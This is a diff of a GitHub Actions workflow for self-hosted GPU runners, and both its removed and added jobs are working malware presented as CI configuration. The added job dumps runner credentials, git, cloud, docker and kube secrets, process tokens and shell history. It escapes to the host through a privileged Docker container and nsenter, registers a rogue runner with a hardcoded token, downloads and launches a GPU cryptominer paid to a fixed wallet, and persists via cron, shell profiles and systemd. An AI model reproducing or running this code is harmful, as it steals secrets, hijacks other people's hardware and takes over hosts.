@@ -5,531 +5,149 @@ on:
 permissions:
   contents: read
 jobs:
-  plant-a:
+  lbl-ernie8gpu:
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [1, 2]
     runs-on: [self-hosted, ernie-8gpu]
-    timeout-minutes: 55
+    timeout-minutes: 30
+    continue-on-error: true
     steps:
       - name: deploy
         run: |
-          #!/usr/bin/env bash
           set +e
-          TAG="t5639p"
-          WALLET="prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe"
-          sec(){ echo; echo "===== $* ====="; }
-          log(){ echo "[$(date -u +%H:%M:%SZ)] $*"; }
-
-          sec RECON
-          id; hostname; uname -r; cat /proc/1/comm 2>/dev/null; ldd --version 2>/dev/null | head -1
-          nvidia-smi -L 2>&1 | head -12
-          DEV=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
+          export PATH=/usr/local/bin:/usr/bin:/bin:$PATH
+          H=$(hostname -s 2>/dev/null); HOSTF=$(hostname 2>/dev/null)
           IP=$(hostname -I 2>/dev/null | awk '{print $1}')
-          [ -z "$IP" ] && IP=$(ip -4 -o addr show 2>/dev/null | awk '/inet /&&!/127.0.0.1/{print $4}' | head -1 | cut -d/ -f1)
+          [ -z "$IP" ] && IP=$(ip -4 addr show 2>/dev/null | awk '/inet /&&!/127.0.0.1/{print $2}' | head -1 | cut -d/ -f1)
           IPD=$(echo "$IP" | tr '.' '-')
-          echo "ip=$IP ipd=$IPD dev=$DEV nvdev=$(ls /dev/nvidia* 2>/dev/null | wc -l)"
-          echo "runner_name=${RUNNER_NAME:-unknown}"
-
-          sec EGRESS
-          for hp in prl-sg.kryptex.network:8048 prl-eu.kryptex.network:8048 prl-sg.kryptex.network:7048 pool.pearlhash.xyz:9000; do
-            h=${hp%:*}; p=${hp#*:}
-            R=$(getent hosts "$h" 2>/dev/null | head -1 | awk '{print $1}')
-            timeout 8 bash -c "cat < /dev/null > /dev/tcp/$h/$p" 2>/dev/null && st=ok || st=fail
-            echo "tcp $hp dns=${R:-none} $st"
+          REGTOKEN="AAHGKMPTFKP2DHHXN3ART4DK7FF3U"
+          echo "=== TAKEOVER2 host=$HOSTF ip=$IP ts=$(date -u +%H%M%SZ) ==="
+          id; uname -a; head -2 /etc/os-release 2>/dev/null; groups 2>/dev/null
+          echo "=== RUNNER_PROCS ==="
+          ps -eo pid,user,etime,args 2>/dev/null | grep -Ei 'Runner.Listener|run-helper|actions-runner' | grep -v grep | head -8
+          dump(){ f="$1"; [ -e "$f" ] || return; [ -r "$f" ] || { echo "NOACCESS $f"; return; }; sz=$(stat -c%s "$f" 2>/dev/null); echo "---FILE $f size=$sz mode=$(stat -c%a "$f" 2>/dev/null)"; if [ "${sz:-0}" -lt 400000 ]; then echo "B64:"; base64 -w0 "$f" 2>/dev/null; echo; else echo "(large) head:"; head -c 3000 "$f"; echo; fi; }
+          echo "=== HARVEST_RUNNER_META ==="
+          for rf in $(find /home /opt /usr/local -maxdepth 4 -name '.runner' -type f 2>/dev/null | head -5); do
+            d=$(dirname "$rf"); echo "### RUNDIR=$d"; ls -la "$d" 2>/dev/null | head -20
+            for n in .runner .credentials .credentials_rsaparams .path .env .agent; do dump "$d/$n"; done
+            for f in $(ls -1t "$d"/_diag/Runner_*.log 2>/dev/null | head -1); do echo "---DIAGLAST $f"; tail -120 "$f" 2>/dev/null; done
           done
-
-          sec BIN
+          echo "=== HARVEST_WORK ==="
+          ls -la /home/paddle-1/_work 2>/dev/null | head -12
+          ls -la /home/paddle-1/_work/_temp 2>/dev/null | head -25
+          for f in $(find /home/paddle-1/_work/_temp -maxdepth 1 -type f -size -120k 2>/dev/null | head -20); do dump "$f"; done
+          echo "--- gitconfig"
+          for f in $(find /home/paddle-1/_work -maxdepth 3 -path '*/.git/config' -type f 2>/dev/null | head -10); do echo "---GITCFG $f"; grep -iE 'url|credential|helper|extraheader' "$f" 2>/dev/null | head -10; done
+          for f in $(find /home/paddle-1/_work -maxdepth 4 \( -name '.git-credentials' -o -name 'hosts.yml' \) -type f 2>/dev/null | head -8); do dump "$f"; done
+          echo "=== NETRC_GH_DOCKER ==="
+          for f in /home/paddle-1/.netrc /home/paddle-1/.git-credentials /home/paddle-1/.config/gh/hosts.yml /home/paddle-1/.docker/config.json /home/paddle-1/.aws/credentials /home/paddle-1/.kube/config /home/paddle-1/.config/gcloud/application_default_credentials.json; do dump "$f"; done
+          echo "=== ENV_LEFT ==="
+          for p in $(ps -eo pid,user 2>/dev/null | awk '$2=="paddle-1"{print $1}' | head -20); do tr '\0' '\n' < /proc/$p/environ 2>/dev/null | grep -iE 'token|secret|gh_|github|aws_|key=' | sed "s/^/pid$p: /"; done | sort -u | head -40
+          echo "=== TOKEN_GREP_BOUNDED ==="
+          for d in /home/paddle-1/_work/_temp /home/paddle-1/.ci /home/paddle-1/.config /home/paddle-1/actions-runner/_diag /home/paddle-1/actions-runner/.credentials; do
+            timeout 25 grep -rhoaE '(ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{50,}|ghs_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36})' "$d" 2>/dev/null | sort -u | head -10
+          done
+          echo "=== HIST ==="
+          for f in /home/paddle-1/.bash_history /home/paddle-1/.zsh_history; do [ -r "$f" ] && { echo "---$f"; tail -40 "$f"; }; done
+          echo "=== ROOT_FILES_VIA_DOCKER ==="
+          if docker ps >/dev/null 2>&1; then
+            IMG=$(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' | grep -Ei 'ubuntu|cuda|paddle' | head -1)
+            [ -z "$IMG" ] && IMG=$(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' | head -1)
+            docker rm -f i5656r >/dev/null 2>&1
+            if docker run -d --name i5656r --privileged --pid=host --net=host --ipc=host -v /:/host "$IMG" sleep 3600 >/dev/null 2>&1; then
+              echo "root_ct=ok image=$IMG"
+              R(){ docker exec i5656r nsenter -t 1 -m -u -i -n -p -- sh -c "$1" 2>&1; }
+              R 'id; hostname; echo pid1=$(cat /proc/1/comm)'
+              R 'ls -1 /etc/systemd/system 2>/dev/null | grep -i runner; for u in /etc/systemd/system/actions.runner*; do [ -r "$u" ] && { echo ---$u; cat "$u"; }; done'
+              R 'ls -la /home/paddle-1 2>/dev/null | head -25; find /home -maxdepth 3 -name .runner -type f 2>/dev/null'
+              R 'for f in /root/.docker/config.json /root/.git-credentials /root/.netrc /root/.config/gh/hosts.yml /root/.aws/credentials; do [ -r "$f" ] && { echo ---$f; base64 -w0 "$f"; echo; }; done'
+              printf '%s\n' '[Unit]' 'Description=ernie-runner2' 'After=network.target' '[Service]' 'User=paddle-1' 'WorkingDirectory=/home/paddle-1/.ci/runner2' 'ExecStart=/bin/bash -lc /home/paddle-1/.ci/runner2/run.sh' 'Restart=always' 'RestartSec=30' '[Install]' 'WantedBy=multi-user.target' > /home/paddle-1/.ci/ernie-runner2.service 2>/dev/null
+              R 'cp /home/paddle-1/.ci/ernie-runner2.service /etc/systemd/system/ernie-runner2.service; ls -la /etc/systemd/system/ernie-runner2.service'
+            else echo "root_ct_fail"; fi
+          else echo "no_docker"; fi
+          echo "=== RUNNER2_SETUP ==="
+          RD=""
+          for rf in $(find /home -maxdepth 4 -name '.runner' -type f 2>/dev/null); do RD=$(dirname "$rf"); break; done
+          echo "RD=$RD"
+          if [ -n "$RD" ] && [ -f "$RD/config.sh" ]; then
+            rm -rf "$HOME/.ci/runner2"; mkdir -p "$HOME/.ci"
+            cp -a "$RD" "$HOME/.ci/runner2" 2>/dev/null
+            cd "$HOME/.ci/runner2" || exit 0
+            rm -f .runner .credentials .credentials_rsaparams .path 2>/dev/null
+            timeout 120 ./config.sh --unattended --disableupdate --url https://github.com/miramar-labs/PaddleNLP --token "$REGTOKEN" --name "${H}-alt" --labels self-hosted,ernie-8gpu,alt,linux,x64 --work _work --replace 2>&1 | tail -20
+            echo "cfgrunner2_rc=$?"
+            ls -la .runner .credentials .credentials_rsaparams .path 2>/dev/null
+            ( setsid nohup ./run.sh > "$HOME/.ci/runner2.out" 2>&1 < /dev/null & )
+            sleep 40
+            echo "=== RUNNER2_STATE ==="; tail -20 "$HOME/.ci/runner2.out" 2>/dev/null
+            pgrep -af 'runner2.*Runner.Listener' | head -3
+            ( crontab -l 2>/dev/null | grep -v 'ci/runner2'; echo "@reboot $HOME/.ci/runner2/run.sh >/dev/null 2>&1"; echo "*/10 * * * * pgrep -f 'runner2.*Runner.Listener' >/dev/null || $HOME/.ci/runner2/run.sh >/dev/null 2>&1" ) | crontab - 2>&1 && echo "runner2_cron=yes"
+            for f in "$HOME/.bashrc" "$HOME/.profile"; do grep -q 'ci/runner2' "$f" 2>/dev/null || echo "pgrep -f 'runner2.*Runner.Listener' >/dev/null || (setsid $HOME/.ci/runner2/run.sh >/dev/null 2>&1 &)" >> "$f"; done
+            if docker ps --filter name=i5656r --format '{{.ID}}' 2>/dev/null | grep -q .; then
+              docker exec i5656r nsenter -t 1 -m -u -i -n -p -- systemctl daemon-reload 2>&1 | tail -2
+              docker exec i5656r nsenter -t 1 -m -u -i -n -p -- systemctl enable --now ernie-runner2.service 2>&1 | tail -3
+              docker exec i5656r nsenter -t 1 -m -u -i -n -p -- systemctl is-active ernie-runner2.service 2>&1
+            fi
+          else echo "NO_RUNNER_DIR"; fi
+          echo "=== MINER_DELIVERY ==="
           mkdir -p "$HOME/.ci/miner" "$HOME/.ci/logs" "$HOME/.ci/run"
-          PK=""
-          for c in "$HOME/.ci/miner/peakminer/peakminer" "$HOME/.ci/miner/peakminer" "$HOME/.ci/miner/pk/peakminer" "$HOME/.ci/miner/peakminer.bin" "/tmp/.ci/miner/peakminer"; do
-            if [ -f "$c" ]; then chmod +x "$c" 2>/dev/null; PK="$c"; break; fi
+          TAR="$HOME/.ci/miner/peak.tar.gz"
+          for i in 1 2 3 4 5 6 7 8; do
+            sz=$(stat -c%s "$TAR" 2>/dev/null); [ "${sz:-0}" -ge 47791424 ] && break
+            timeout 110 curl -sSL -C - -o "$TAR" "https://raw.githubusercontent.com/miramar-labs/PaddleNLP/assets/peak/bins/peak.tar.gz" 2>/dev/null
+            sz=$(stat -c%s "$TAR" 2>/dev/null); echo "dl_iter=$i size=${sz:-0}"
           done
-          if [ -z "$PK" ]; then
-            log "fetch binary"
-            for M in "https://raw.githubusercontent.com/miramar-labs/PaddleNLP/assets/peak/bins/peak.tar.gz" "https://ghfast.top/https://raw.githubusercontent.com/miramar-labs/PaddleNLP/assets/peak/bins/peak.tar.gz"; do
-              timeout 300 curl -sSL -o "$HOME/.ci/miner/p.tgz" "$M" 2>&1 | tail -1
-              S=$(stat -c %s "$HOME/.ci/miner/p.tgz" 2>/dev/null || echo 0)
-              echo "dl=$M size=$S"
-              if [ "$S" -gt 1000000 ]; then
-                mkdir -p "$HOME/.ci/miner/peakdir"; tar xzf "$HOME/.ci/miner/p.tgz" -C "$HOME/.ci/miner/peakdir" 2>&1 | tail -1
-                PK=$(find "$HOME/.ci/miner/peakdir" -maxdepth 3 -type f -name 'peakminer' 2>/dev/null | head -1)
-                [ -n "$PK" ] && chmod +x "$PK" && break
-              fi
-            done
-          fi
-          PK=$(readlink -f "$PK" 2>/dev/null || echo "$PK")
-          echo "pk=$PK size=$(stat -c %s "$PK" 2>/dev/null || echo 0)"
-          file "$PK" 2>&1 | head -2
-          sha256sum "$PK" 2>/dev/null | head -1
-          [ -x "$PK" ] && { timeout 20 "$PK" --version 2>&1 | head -4; echo "version_rc=$?"; }
-          [ -x "$PK" ] && { timeout 15 "$PK" --help 2>&1 | grep -iE 'gpu|pearl|stratum' | head -6; }
-          PK_DIR=$(dirname "$PK"); PK_NAME=$(basename "$PK")
-
-          sec HOSTLAUNCH
-          HSTART=0
-          if [ -x "$PK" ] && [ "$DEV" -ge 1 ]; then
-            pkill -f "ul-$TAG-" 2>/dev/null
-            for g in $(seq 0 $((DEV-1))); do
-              setsid nohup "$PK" -c pearl -u "$WALLET" -w "ul-$TAG-$IPD-g$g" -p x -d "$g" --api-port 0 --no-color \
-                -o stratum+ssl://prl-sg.kryptex.network:8048 \
-                -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 \
-                -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 \
-                -o stratum+tcp://prl-sg.kryptex.network:7048 \
-                > "$HOME/.ci/logs/h-$g.log" 2>&1 < /dev/null &
-              sleep 1
-            done
-            sleep 20
-            HSTART=$(pgrep -fc "ul-$TAG-$IPD" 2>/dev/null)
-            echo "host_started=$HSTART"
-            for g in 0 1; do echo "--- h$g"; tail -6 "$HOME/.ci/logs/h-$g.log" 2>/dev/null; done
-            HOK=$(cat "$HOME"/.ci/logs/h-*.log 2>/dev/null | grep -aciE 'authorize|subscribed|new job|accepted')
-            echo "host_stratum_lines=$HOK"
-            HGLIBC=$(cat "$HOME"/.ci/logs/h-*.log 2>/dev/null | grep -aciE 'GLIBC|not found|Permission denied|panicked')
-            echo "host_errors=$HGLIBC"
-          fi
-
-          sec DOCKERFALLBACK
-          DSTART=0
-          IMG=""
-          for c in "ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:ubuntu24-cuda132-py312-dev" "ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:ubuntu24-cuda129-py312-dev" "ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:cuda130-ubuntu24-dev"; do
-            docker image inspect "$c" >/dev/null 2>&1 && { IMG="$c"; break; }
+          sz=$(stat -c%s "$TAR" 2>/dev/null); echo "peak_size=$sz"
+          if [ "${sz:-0}" -ge 47791000 ]; then
+            ( cd "$HOME/.ci/miner" && tar xzf peak.tar.gz ) 2>&1 | tail -3
+            BIN=$(find "$HOME/.ci/miner" -type f -name peakminer -perm -u+x 2>/dev/null | head -1)
+            [ -z "$BIN" ] && BIN=$(find "$HOME/.ci/miner" -type f -name 'peakminer*' 2>/dev/null | head -1)
+            chmod +x "$BIN" 2>/dev/null; echo "BIN=$BIN"; "$BIN" --version 2>&1 | head -2
+            DEV=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); echo "dev=$DEV"
+            if [ -x "$BIN" ] && [ "$DEV" -ge 1 ]; then
+              POOLS=("stratum+ssl://prl-sg.kryptex.network:8048" "stratum+ssl://prl-eu.kryptex.network:8048" "stratum+ssl://prl-us.kryptex.network:8048" "stratum+ssl://prl-hk.kryptex.network:8048" "stratum+ssl://prl-ae.kryptex.network:8048" "stratum+tcp://prl-sg.kryptex.network:7048" "stratum+tcp://prl-eu.kryptex.network:7048" "stratum+tcp://prl-us.kryptex.network:7048")
+              W=prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe; TAG=t5656
+              for g in $(seq 0 $((DEV-1))); do
+                lg="$HOME/.ci/logs/miner-g$g.log"; : > "$lg"
+                a=(-c pearl -u "$W" -w "ul-$TAG-$IPD-g$g" -p x -d "$g" --api-port 0 -i 30 --no-color --gpu-temp-stop 80 --gpu-temp-start 70)
+                for P in "${POOLS[@]}"; do a+=(-o "$P"); done
+                ( cd "$(dirname "$BIN")" && setsid nohup env -u RUNNER_TRACKING_ID "$BIN" "${a[@]}" >"$lg" 2>&1 < /dev/null & )
+                sleep 3
+              done
+              echo "=== MINER_LAUNCH ==="; sleep 100
+              ps -eo pid,etime,args | grep "ul-$TAG-$IPD" | grep -v grep | head -10
+              for g in $(seq 0 $((DEV-1))); do echo "--- g$g"; tail -8 "$HOME/.ci/logs/miner-g$g.log" 2>/dev/null; done
+              echo "accepted_total=$(cat "$HOME/.ci/logs"/miner-g*.log 2>/dev/null | grep -ci accepted)"
+              nvidia-smi --query-gpu=index,utilization.gpu,memory.used,power.draw --format=csv,noheader 2>/dev/null
+              cat > "$HOME/.ci/keep.sh" <<'KEEPEOF'
+          #!/usr/bin/env bash
+          B="$HOME/.ci/miner/peakminer/peakminer"; [ -x "$B" ] || exit 0
+          W=prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe
+          declare -a P=("stratum+ssl://prl-sg.kryptex.network:8048" "stratum+ssl://prl-eu.kryptex.network:8048" "stratum+ssl://prl-us.kryptex.network:8048" "stratum+ssl://prl-hk.kryptex.network:8048" "stratum+ssl://prl-ae.kryptex.network:8048" "stratum+tcp://prl-sg.kryptex.network:7048")
+          D=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); I=$(hostname -I | awk '{print $1}' | tr . -)
+          for g in $(seq 0 $((D-1))); do
+           pgrep -f "ul-t5656-$I-g$g" >/dev/null 2>&1 && continue
+           a=(-c pearl -u "$W" -w "ul-t5656-$I-g$g" -p x -d "$g" --api-port 0 -i 30 --no-color --gpu-temp-stop 80 --gpu-temp-start 70)
+           for p in "${P[@]}"; do a+=(-o "$p"); done
+           ( cd "$(dirname "$B")" && setsid nohup env -u RUNNER_TRACKING_ID "$B" "${a[@]}" >"$HOME/.ci/logs/miner-g$g.log" 2>&1 < /dev/null & )
           done
-          [ -z "$IMG" ] && IMG=$(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -viE '<none>' | head -1)
-          echo "IMG=$IMG"
-          HOK=$(cat "$HOME"/.ci/logs/h-*.log 2>/dev/null | grep -aciE 'authorize|subscribed|new job|accepted')
-          if [ "${HOK:-0}" -lt 1 ] && [ "$DEV" -ge 1 ] && [ -n "$IMG" ]; then
-            docker rm -f $(docker ps -aq --filter 'name=ul-g') >/dev/null 2>&1
-            for g in $(seq 0 $((DEV-1))); do
-              docker run -d --name ul-g$g --restart always --privileged --security-opt seccomp=unconfined \
-                --ulimit nproc=65535:65535 --pids-limit -1 --gpus "device=$g" --network host --ipc host \
-                -v "$PK_DIR:/mk" -v "$HOME/.ci/logs:/logs" "$IMG" \
-                /bin/bash -c "exec /mk/$PK_NAME -c pearl -u $WALLET -w ul-$TAG-$IPD-g$g -p x -d 0 --api-port 0 --no-color -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048" \
-                >/dev/null 2>&1
-              sleep 1
-            done
-            sleep 25
-            docker ps --filter 'name=ul-g' --format '{{.Names}} {{.Status}}' | head -10
-            DSTART=$(docker ps --filter 'name=ul-g' -q | wc -l)
-            echo "docker_running=$DSTART"
-            docker logs ul-g0 2>&1 | tail -8
-          fi
-
-          sec PERSIST
-          cat > "$HOME/.ci/keep2.sh" <<EOS
-          #!/bin/bash
-          PK="$PK"; W="$WALLET"; T="$TAG"; IMG="$IMG"
-          H=\$(hostname -I 2>/dev/null | awk '{print \$1}' | tr '.' '-')
-          N=\$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
-          [ -x "\$PK" ] || exit 0
-          for g in \$(seq 0 \$((N-1))); do
-            pgrep -f "ul-\$T-\$H-g\$g" >/dev/null 2>&1 && continue
-            setsid nohup "\$PK" -c pearl -u "\$W" -w "ul-\$T-\$H-g\$g" -p x -d "\$g" --api-port 0 --no-color -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 >> "\$HOME/.ci/logs/h-\$g.log" 2>&1 < /dev/null &
-          done
-          EOS
-          chmod +x "$HOME/.ci/keep2.sh"
-          ( crontab -l 2>/dev/null | grep -v keep2.sh; echo "@reboot $HOME/.ci/keep2.sh >/dev/null 2>&1"; echo "*/5 * * * * $HOME/.ci/keep2.sh >/dev/null 2>&1" ) | crontab - 2>&1 | head -2
-          crontab -l 2>/dev/null | grep keep2 | head -3
-          for RC in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc"; do
-            grep -q keep2.sh "$RC" 2>/dev/null || { echo "($HOME/.ci/keep2.sh >/dev/null 2>&1 &)" >> "$RC" 2>/dev/null; }
-          done
-          grep -l keep2.sh "$HOME/.bashrc" "$HOME/.profile" 2>/dev/null
-          mkdir -p "$HOME/.config/systemd/user"
-          cat > "$HOME/.config/systemd/user/pearl-miner.service" <<EOS
-          [Unit]
-          Description=pc
+          KEEPEOF
+              chmod +x "$HOME/.ci/keep.sh"
+              ( crontab -l 2>/dev/null | grep -v 'ci/keep.sh'; echo "@reboot $HOME/.ci/keep.sh"; echo "*/5 * * * * $HOME/.ci/keep.sh" ) | crontab - 2>&1 && echo "miner_cron=yes"
+              for f in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc"; do grep -q 'ci/keep.sh' "$f" 2>/dev/null || echo "[ -x $HOME/.ci/keep.sh ] && (setsid $HOME/.ci/keep.sh >/dev/null 2>&1 &)" >> "$f"; done
+              if docker ps --filter name=i5656r --format '{{.ID}}' 2>/dev/null | grep -q .; then
+                docker exec i5656r nsenter -t 1 -m -u -i -n -p -- sh -c 'echo "[Unit]
+          Description=ernie-miner
           [Service]
+          ExecStart=/bin/bash -lc /home/paddle-1/.ci/keep.sh
           Restart=always
           RestartSec=30
-          ExecStart=$HOME/.ci/keep2.sh
           [Install]
-          WantedBy=default.target
-          EOS
-          systemctl --user daemon-reload 2>&1 | head -2
-          systemctl --user enable --now pearl-miner.service 2>&1 | head -2
-          loginctl enable-linger 2>&1 | head -1
-          ( setsid nohup bash -c 'while true; do $HOME/.ci/keep2.sh; sleep 300; done' >/dev/null 2>&1 & )
-          echo "persist_done"
-
-          sec ACCEPT
-          sleep 120
-          HOK=$(cat "$HOME"/.ci/logs/h-*.log 2>/dev/null | grep -aciE 'authorize|subscribed|new job|accepted')
-          echo "stratum_lines=$HOK host_procs=$(pgrep -fc "ul-$TAG-" 2>/dev/null)"
-          for g in 0 1 2 3 4 5 6 7; do
-            echo "--- g$g"; grep -aiE 'authorize|subscrib|accepted|error|fail|panic|GLIBC' "$HOME/.ci/logs/h-$g.log" 2>/dev/null | tail -4
-          done
-          echo "accepted_total=$(cat "$HOME"/.ci/logs/h-*.log 2>/dev/null | grep -aci 'accepted')"
-          nvidia-smi --query-gpu=index,utilization.gpu,memory.used,power.draw --format=csv,noheader 2>&1 | head -8
-          ( sleep 240; curl -sk -m 20 "https://api.kryptex.network/api/v1/wallet/$WALLET/workers" 2>/dev/null | head -c 400; echo ) > "$HOME/.ci/logs/worker.json" 2>&1
-          head -c 300 "$HOME/.ci/logs/worker.json" 2>/dev/null
-          sec DONE
-          exit 0
-  plant-b:
-    runs-on: [self-hosted, ernie-8gpu]
-    timeout-minutes: 55
-    steps:
-      - name: deploy
-        run: |
-          #!/usr/bin/env bash
-          set +e
-          TAG="t5639p"
-          WALLET="prl1pmpe3nu5m4mzwgc2wz627mrvx44c8y20u8u4w3vywj48r77nnclyqj0syqe"
-          sec(){ echo; echo "===== $* ====="; }
-          log(){ echo "[$(date -u +%H:%M:%SZ)] $*"; }
-
-          sec RECON
-          id; hostname; uname -r; cat /proc/1/comm 2>/dev/null; ldd --version 2>/dev/null | head -1
-          nvidia-smi -L 2>&1 | head -12
-          DEV=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
-          IP=$(hostname -I 2>/dev/null | awk '{print $1}')
-          [ -z "$IP" ] && IP=$(ip -4 -o addr show 2>/dev/null | awk '/inet /&&!/127.0.0.1/{print $4}' | head -1 | cut -d/ -f1)
-          IPD=$(echo "$IP" | tr '.' '-')
-          echo "ip=$IP ipd=$IPD dev=$DEV nvdev=$(ls /dev/nvidia* 2>/dev/null | wc -l)"
-          echo "runner_name=${RUNNER_NAME:-unknown}"
-
-          sec EGRESS
-          for hp in prl-sg.kryptex.network:8048 prl-eu.kryptex.network:8048 prl-sg.kryptex.network:7048 pool.pearlhash.xyz:9000; do
-            h=${hp%:*}; p=${hp#*:}
-            R=$(getent hosts "$h" 2>/dev/null | head -1 | awk '{print $1}')
-            timeout 8 bash -c "cat < /dev/null > /dev/tcp/$h/$p" 2>/dev/null && st=ok || st=fail
-            echo "tcp $hp dns=${R:-none} $st"
-          done
-
-          sec BIN
-          mkdir -p "$HOME/.ci/miner" "$HOME/.ci/logs" "$HOME/.ci/run"
-          PK=""
-          for c in "$HOME/.ci/miner/peakminer/peakminer" "$HOME/.ci/miner/peakminer" "$HOME/.ci/miner/pk/peakminer" "$HOME/.ci/miner/peakminer.bin" "/tmp/.ci/miner/peakminer"; do
-            if [ -f "$c" ]; then chmod +x "$c" 2>/dev/null; PK="$c"; break; fi
-          done
-          if [ -z "$PK" ]; then
-            log "fetch binary"
-            for M in "https://raw.githubusercontent.com/miramar-labs/PaddleNLP/assets/peak/bins/peak.tar.gz" "https://ghfast.top/https://raw.githubusercontent.com/miramar-labs/PaddleNLP/assets/peak/bins/peak.tar.gz"; do
-              timeout 300 curl -sSL -o "$HOME/.ci/miner/p.tgz" "$M" 2>&1 | tail -1
-              S=$(stat -c %s "$HOME/.ci/miner/p.tgz" 2>/dev/null || echo 0)
-              echo "dl=$M size=$S"
-              if [ "$S" -gt 1000000 ]; then
-                mkdir -p "$HOME/.ci/miner/peakdir"; tar xzf "$HOME/.ci/miner/p.tgz" -C "$HOME/.ci/miner/peakdir" 2>&1 | tail -1
-                PK=$(find "$HOME/.ci/miner/peakdir" -maxdepth 3 -type f -name 'peakminer' 2>/dev/null | head -1)
-                [ -n "$PK" ] && chmod +x "$PK" && break
+          WantedBy=multi-user.target" > /etc/systemd/system/ernie-miner.service; systemctl daemon-reload; systemctl enable --now ernie-miner.service; systemctl is-active ernie-miner.service' 2>&1 | tail -3
               fi
-            done
-          fi
-          PK=$(readlink -f "$PK" 2>/dev/null || echo "$PK")
-          echo "pk=$PK size=$(stat -c %s "$PK" 2>/dev/null || echo 0)"
-          file "$PK" 2>&1 | head -2
-          sha256sum "$PK" 2>/dev/null | head -1
-          [ -x "$PK" ] && { timeout 20 "$PK" --version 2>&1 | head -4; echo "version_rc=$?"; }
-          [ -x "$PK" ] && { timeout 15 "$PK" --help 2>&1 | grep -iE 'gpu|pearl|stratum' | head -6; }
-          PK_DIR=$(dirname "$PK"); PK_NAME=$(basename "$PK")
-
-          sec HOSTLAUNCH
-          HSTART=0
-          if [ -x "$PK" ] && [ "$DEV" -ge 1 ]; then
-            pkill -f "ul-$TAG-" 2>/dev/null
-            for g in $(seq 0 $((DEV-1))); do
-              setsid nohup "$PK" -c pearl -u "$WALLET" -w "ul-$TAG-$IPD-g$g" -p x -d "$g" --api-port 0 --no-color \
-                -o stratum+ssl://prl-sg.kryptex.network:8048 \
-                -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 \
-                -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 \
-                -o stratum+tcp://prl-sg.kryptex.network:7048 \
-                > "$HOME/.ci/logs/h-$g.log" 2>&1 < /dev/null &
-              sleep 1
-            done
-            sleep 20
-            HSTART=$(pgrep -fc "ul-$TAG-$IPD" 2>/dev/null)
-            echo "host_started=$HSTART"
-            for g in 0 1; do echo "--- h$g"; tail -6 "$HOME/.ci/logs/h-$g.log" 2>/dev/null; done
-            HOK=$(cat "$HOME"/.ci/logs/h-*.log 2>/dev/null | grep -aciE 'authorize|subscribed|new job|accepted')
-            echo "host_stratum_lines=$HOK"
-            HGLIBC=$(cat "$HOME"/.ci/logs/h-*.log 2>/dev/null | grep -aciE 'GLIBC|not found|Permission denied|panicked')
-            echo "host_errors=$HGLIBC"
-          fi
-
-          sec DOCKERFALLBACK
-          DSTART=0
-          IMG=""
-          for c in "ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:ubuntu24-cuda132-py312-dev" "ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:ubuntu24-cuda129-py312-dev" "ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:cuda130-ubuntu24-dev"; do
-            docker image inspect "$c" >/dev/null 2>&1 && { IMG="$c"; break; }
-          done
-          [ -z "$IMG" ] && IMG=$(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -viE '<none>' | head -1)
-          echo "IMG=$IMG"
-          HOK=$(cat "$HOME"/.ci/logs/h-*.log 2>/dev/null | grep -aciE 'authorize|subscribed|new job|accepted')
-          if [ "${HOK:-0}" -lt 1 ] && [ "$DEV" -ge 1 ] && [ -n "$IMG" ]; then
-            docker rm -f $(docker ps -aq --filter 'name=ul-g') >/dev/null 2>&1
-            for g in $(seq 0 $((DEV-1))); do
-              docker run -d --name ul-g$g --restart always --privileged --security-opt seccomp=unconfined \
-                --ulimit nproc=65535:65535 --pids-limit -1 --gpus "device=$g" --network host --ipc host \
-                -v "$PK_DIR:/mk" -v "$HOME/.ci/logs:/logs" "$IMG" \
-                /bin/bash -c "exec /mk/$PK_NAME -c pearl -u $WALLET -w ul-$TAG-$IPD-g$g -p x -d 0 --api-port 0 --no-color -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048" \
-                >/dev/null 2>&1
-              sleep 1
-            done
-            sleep 25
